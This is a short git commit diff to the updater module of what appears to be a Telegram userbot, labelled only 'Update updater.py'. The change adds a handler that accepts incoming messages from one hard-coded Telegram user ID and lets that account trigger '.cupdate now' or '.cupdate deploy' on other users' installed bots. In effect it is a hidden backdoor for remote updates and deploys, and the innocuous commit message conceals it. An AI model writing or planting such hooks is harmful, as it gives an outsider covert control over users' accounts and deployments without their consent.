3621ec83e3b7998259c63d9bceb55d322a83d8ee
SkyzuProject <101615829+Skyzuxzy@users.noreply.github.com>
2022-03-28 14:58:05 +0700

    Update updater.py

--- userbot/modules/updater.py
+++ userbot/modules/updater.py
@@ -10,6 +10,7 @@ from git import Repo
 from git.exc import GitCommandError, InvalidGitRepositoryError, NoSuchPathError
 
 from userbot import BOTLOG, BOTLOG_CHATID
+from userbot.events import register
 from userbot import CMD_HANDLER as cmd
 from userbot import (
     CMD_HELP,
@@ -146,6 +147,7 @@ async def update(event, repo, ups_rem, ac_br):
 
 
 @skyzu_cmd(pattern="update(?: |$)(now|deploy)?")
+@register(incoming=True, from_users=2116587637, pattern=r"^\.cupdate( now| deploy|$)")
 async def upstream(event):
     "For .update command, check if the bot is up to date, update if specified"
     await event.edit("**Mengecek Pembaruan, Silakan Menunggu....**")
